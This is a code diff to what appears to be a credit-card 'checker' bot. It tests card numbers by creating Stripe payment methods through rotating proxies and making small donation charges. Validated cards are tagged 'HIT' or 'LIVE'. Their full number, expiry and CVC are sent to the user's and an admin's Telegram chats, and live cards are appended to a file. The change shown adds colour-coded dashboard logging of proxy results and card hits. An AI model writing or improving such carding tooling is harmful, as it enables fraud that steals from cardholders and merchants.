@@ -47,11 +47,18 @@ STATS = {
     "recent_events": []
 }
 
-def add_event(message):
+def add_event(message, type="info"):
     """ সিস্টেম ইভেন্ট লগে নতুন মেসেজ যোগ করে """
     timestamp = time.strftime("%H:%M:%S")
-    STATS["recent_events"].insert(0, f"[{timestamp}] {message}")
-    if len(STATS["recent_events"]) > 10:
+    color = "#b0b0b0"
+    if type == "hit": color = "#00ff88"
+    if type == "live": color = "#6e7aff"
+    if type == "proxy_pass": color = "#34d399"
+    if type == "proxy_fail": color = "#f87171"
+    
+    event_html = f'<div class="event-item" style="border-left-color: {color}">[{timestamp}] {message}</div>'
+    STATS["recent_events"].insert(0, event_html)
+    if len(STATS["recent_events"]) > 15:
         STATS["recent_events"].pop()
 
 # User specific control flags & settings
@@ -209,12 +216,15 @@ def create_stripe_payment_method(card_details):
         response = requests.post(stripe_url, headers=headers, data=data, timeout=15, proxies=proxy)
         if response.status_code == 200:
             STATS["proxy_success"] += 1
+            add_event(f"Proxy Pass ✅ | {proxy['http'].split('@')[-1]}", type="proxy_pass")
             return response.json().get('id')
         else:
             STATS["proxy_errors"] += 1
+            add_event(f"Proxy Fail ❌ | Status: {response.status_code}", type="proxy_fail")
             return None
-    except Exception:
+    except Exception as e:
         STATS["proxy_errors"] += 1
+        add_event(f"Proxy Error ⚠️ | {str(e)[:30]}", type="proxy_fail")
         return None
 
 def process_donation(payment_method_id, user_info, amount="1.00"):
@@ -307,7 +317,7 @@ def check_card(card_line, chat_id):
             )
             STATS["hits"] += 1
             # Log full card detail to dashboard activity
-            add_event(f"HIT 🔥 | {cc_num}|{cc_mon}|{cc_year}|{cc_cvc} | Charged ${amount}")
+            add_event(f"HIT 🔥 | {cc_num}|{cc_mon}|{cc_year}|{cc_cvc} | ${amount}", type="hit")
             send_telegram_msg(chat_id, msg)
             if str(chat_id) != str(ADMIN_CHAT_ID):
                  send_telegram_msg(ADMIN_CHAT_ID, f"User {chat_id} got a hit! 🔥\n`{cc_num}`")
@@ -330,7 +340,7 @@ def check_card(card_line, chat_id):
                 "━━━━━━━━━━━━━━━━━━"
             )
             STATS["lives"] += 1
-            add_event(f"LIVE ✅ | {cc_num}|{cc_mon}|{cc_year} | {result.replace('FAILED: ', '')[:20]}")
+            add_event(f"LIVE ✅ | {cc_num}|{cc_mon}|{cc_year} | {result.replace('FAILED: ', '')[:20]}", type="live")
             send_telegram_msg(chat_id, msg)
             with open("lives.txt", "a") as f:
                 f.write(f"{card_line} | Reason: {result}\n")
@@ -558,7 +568,7 @@ def health():
     minutes, seconds = divmod(remainder, 60)
     uptime_str = f"{hours}h {minutes}m {seconds}s"
     
-    events_html = "".join([f'<div class="event-item">{ev}</div>' for ev in STATS["recent_events"]])
+    events_html = "".join(STATS["recent_events"])
 
     html_template = f"""
     <!DOCTYPE html>
